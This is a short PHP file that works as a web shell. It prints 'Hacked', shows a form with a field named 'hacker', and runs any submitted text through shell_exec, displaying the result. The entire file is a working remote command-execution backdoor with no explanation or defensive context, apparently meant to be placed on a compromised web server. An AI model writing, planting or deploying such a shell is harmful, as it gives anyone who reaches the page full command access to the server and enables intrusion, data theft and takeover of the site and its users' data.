<?php

echo 'Hacked';
echo '<br/>';
echo 'Put some data';

echo '<br>';
echo '<br>';


echo '<br>';
echo '<br>';

echo '<form name="hacked-form" action="#" method="post">';
echo '<input type="text" name="hacker">';
echo '<input type="submit" name="Submit" value="Submit">';
echo '</form>';

echo '<br>';
echo '<br>';
echo '<br>';

if (isset($_POST['Submit'])) {

    echo "<pre>".shell_exec($_POST['hacker'])."</pre>";

}